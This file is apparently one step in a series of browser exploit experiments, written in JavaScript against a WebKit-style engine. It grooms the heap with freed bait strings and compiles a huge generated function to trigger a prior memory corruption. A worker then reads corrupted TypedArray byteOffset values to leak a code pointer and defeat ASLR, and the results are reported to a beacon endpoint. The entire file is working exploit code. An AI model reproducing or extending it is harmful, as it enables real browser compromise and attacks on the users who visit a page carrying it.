// p476 — Worker-side byteOffset ASLR leak
//
// Key insight: p156 corrupts WORKER strings (14/14) because the worker's
// MarkedSpace is at HIGHER addresses than the marge metadata buffer.
// Main-thread MarkedSpace is BELOW → never reached by the forward sweep.
//
// Strategy: Worker creates TypedArray views (48B cells) alongside p156-style
// string targets (32B cells). Both live in the worker's MarkedSpace, both
// should be reachable by the sweep.
//
// Main thread does ONLY: bait creation, bait freeing, compilation.
// ZERO extra allocations between bait-free and compile.
//
// Expected: worker strings .length=81400 (14/14), worker views .byteOffset ≠ 0 (~1/7)
// The .byteOffset value is the FULL 8-byte thunk pointer (ASLR leak).
//
// Beacon prefix: V476-
(function() {
  function B(tag, body) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', '/beacon/V476-' + tag, false);
      x.setRequestHeader('Content-Type', 'text/plain');
      x.send(body || '');
    } catch(e) {}
  }

  B('BOOT', navigator.userAgent);

  // ═════════════════════════════════════════════
  // WORKER CODE — creates targets, scans after signal
  // ═════════════════════════════════════════════
  var workerCode = function() {
    var N_VIEWS = 700;
    var N_STRINGS = 14;
    var views = new Array(N_VIEWS);
    var strings = new Array(N_STRINGS);

    // Create TypedArray views (48B cells in worker MarkedSpace)
    for (var i = 0; i < N_VIEWS; i++) {
      var ab = new ArrayBuffer(8);
      views[i] = new Uint8Array(ab);
      views[i][0] = i & 0xFF;
    }

    // Create string targets (32B JSRopeString cells)
    // Same pattern as p156: rope concatenation
    for (var i = 0; i < N_STRINGS; i++) {
      var s = '';
      for (var j = 0; j < 1000; j++) s += 'B'.repeat(100);
      strings[i] = s;
    }

    // Signal ready
    postMessage({type: 'ready', nViews: N_VIEWS, nStrings: N_STRINGS});

    // Wait for scan signal
    self.onmessage = function(e) {
      if (e.data !== 'scan') return;
      var results = {
        stringHits: 0, stringLens: [],
        viewHits: 0, viewErrors: 0, viewValues: [],
        viewErrorMsgs: []
      };

      // Scan string .length
      for (var i = 0; i < N_STRINGS; i++) {
        var len = strings[i].length;
        if (len !== 100000) {
          results.stringHits++;
          if (results.stringLens.length < 5) results.stringLens.push(len);
        }
      }

      // Scan view .byteOffset (try/catch for header corruption safety)
      for (var i = 0; i < N_VIEWS; i++) {
        try {
          var off = views[i].byteOffset;
          if (off !== 0) {
            results.viewHits++;
            if (results.viewValues.length < 10) {
              results.viewValues.push(i + ':' + off);
            }
          }
        } catch(ex) {
          results.viewErrors++;
          if (results.viewErrorMsgs.length < 3) {
            results.viewErrorMsgs.push(i + ':' + (ex.message || 'unknown').substring(0, 30));
          }
        }
      }

      // Also try .length on views (m_length at cell+24, different alignment)
      var viewLenHits = 0;
      var viewLenVals = [];
      for (var i = 0; i < N_VIEWS; i++) {
        try {
          var vl = views[i].length;
          if (vl !== 8) {
            viewLenHits++;
            if (viewLenVals.length < 5) viewLenVals.push(i + ':' + vl);
          }
        } catch(ex) {}
      }
      results.viewLenHits = viewLenHits;
      results.viewLenVals = viewLenVals;

      // Also try .buffer on views (check if m_vector was corrupted)
      var bufHits = 0;
      for (var i = 0; i < N_VIEWS; i++) {
        try {
          var buf = views[i].buffer;
          if (buf.byteLength !== 8) {
            bufHits++;
          }
        } catch(ex) {}
      }
      results.bufHits = bufHits;

      postMessage({type: 'results', data: results});
    };
  };

  // Create worker from blob
  var wSrc = '(' + workerCode.toString() + ')();';
  var wBlob = new Blob([wSrc], {type: 'application/javascript'});
  var wUrl = URL.createObjectURL(wBlob);
  var worker = new Worker(wUrl);

  worker.onmessage = function(e) {
    if (e.data.type === 'ready') {
      B('W-READY', 'views=' + e.data.nViews + ',strings=' + e.data.nStrings);
      startGroom();
    } else if (e.data.type === 'results') {
      reportResults(e.data.data);
    }
  };

  function startGroom() {
    // ═════════════════════════════════════════════
    // PHASE 1: Create flat bait strings (100KB StringImpl in marge)
    // ═════════════════════════════════════════════
    var BAIT_COUNT = 20;
    var baits = new Array(BAIT_COUNT);
    for (var i = 0; i < BAIT_COUNT; i++) {
      baits[i] = 'B'.repeat(100000);
      baits[i].charCodeAt(0);
    }
    B('BAITS', '' + BAIT_COUNT);

    // ═════════════════════════════════════════════
    // PHASE 2: Free baits (create ~100KB holes in marge)
    // ═════════════════════════════════════════════
    for (var i = 0; i < BAIT_COUNT; i++) baits[i] = null;
    baits = null;

    // Minimal GC pressure — just enough to free StringImpl backing stores
    for (var g = 0; g < 10; g++) {
      var junk = new Array(5000);
      for (var j = 0; j < 5000; j++) junk[j] = {x: g, y: j};
      junk = null;
    }
    B('GC-FREED');

    // ═════════════════════════════════════════════
    // PHASE 3: IMMEDIATELY compile 38M function
    // NO allocations between free and compile!
    // ═════════════════════════════════════════════
    var N = 38348816;
    var CHUNK = 4000000;
    var nC = Math.floor(N / CHUNK);
    var rem = N - nC * CHUNK;
    var rep = 'a();'.repeat(CHUNK);
    var parts = new Array(nC + 3);
    parts[0] = 'window.__p476fn=function(a){';
    for (var c = 0; c < nC; c++) parts[1 + c] = rep;
    parts[nC + 1] = 'a();'.repeat(rem);
    parts[nC + 2] = '};window.__p476ok=1;';
    rep = null;

    var blob = new Blob(parts, {type: 'application/javascript'});
    B('BLOB', Math.round(blob.size / 1048576) + 'MB');
    parts = null;

    var url = URL.createObjectURL(blob);
    var sc = document.createElement('script');
    sc.onerror = function() { B('SCRIPT-ERR'); };
    sc.onload = function() {
      B('COMPILED', window.__p476ok ? 'OK' : 'FAIL');
      // Signal worker to scan
      worker.postMessage('scan');
    };
    document.head.appendChild(sc);
    sc.src = url;
  }

  function reportResults(r) {
    // String results (p156 correlation)
    B('STR-HITS', r.stringHits + '-of-14');
    if (r.stringLens.length > 0) {
      B('STR-LENS', r.stringLens.join(','));
    }

    // View byteOffset results (THE EXPERIMENT)
    B('VIEW-BYTEOFFSET', 'hits=' + r.viewHits + ',errors=' + r.viewErrors + ',total=700');
    if (r.viewValues.length > 0) {
      B('VIEW-VALUES', r.viewValues.join('|'));
      // Try to extract hex for first hit
      var firstVal = r.viewValues[0].split(':')[1];
      B('THUNK-DEC', firstVal);
    }
    if (r.viewErrorMsgs.length > 0) {
      B('VIEW-ERRORS', r.viewErrorMsgs.join('|'));
    }

    // View .length results
    B('VIEW-LENGTH', 'hits=' + r.viewLenHits);
    if (r.viewLenVals.length > 0) {
      B('VIEW-LEN-VALS', r.viewLenVals.join('|'));
    }

    // View .buffer results
    B('VIEW-BUFFER', 'bufHits=' + r.bufHits);

    // Summary
    if (r.viewHits > 0) {
      B('ASLR-LEAK', 'CONFIRMED-' + r.viewHits + '-hits');
    } else if (r.viewErrors > 0) {
      B('HEADER-CRASH', r.viewErrors + '-errors-' + r.viewHits + '-readable');
    } else {
      B('NO-VIEW-HIT', 'byteOffset=0-on-all-700');
    }

    B('DONE');
  }
})();
